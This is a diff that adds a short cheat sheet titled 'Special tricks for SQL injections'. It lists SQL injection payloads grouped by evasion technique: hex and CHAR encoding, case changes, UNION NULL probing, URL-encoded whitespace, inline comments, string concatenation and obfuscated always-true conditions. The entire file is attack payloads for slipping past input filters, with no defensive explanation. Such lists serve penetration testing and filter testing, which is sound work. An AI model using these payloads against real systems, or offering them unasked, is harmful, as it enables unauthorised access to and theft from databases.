@@ -1,0 +1,34 @@
+Special tricks for SQL injections :~
+
+-- Hex Encoding
+' OR 0x31=0x31 --
+
+-- Case Manipulation
+' Or '1'='1' --
+' oR '1'='1' --
+
+-- Using NULLs
+' UNION SELECT NULL,NULL,NULL--
+
+-- White space tricks
+'%20OR%201=1--
+'%09OR%091=1--
+'%0aOR%0a1=1--
+
+-- Inline Comments
+'/*!50000OR*/1=1--
+'/**/OR/**/1=1--
+
+-- String Concatenation
+' OR 'te'+'st'='test'--
+' OR 'te'||'st'='test'--
+
+-- Char Injection
+' OR CHAR(49)=CHAR(49)--
+' OR NCHAR(65)=NCHAR(65)--
+
+-- Obfuscation
+' OR %31%3d%31--
+' OR TRUE--
+' OR FALSE=FALSE--
+' OR ' ' = ' '
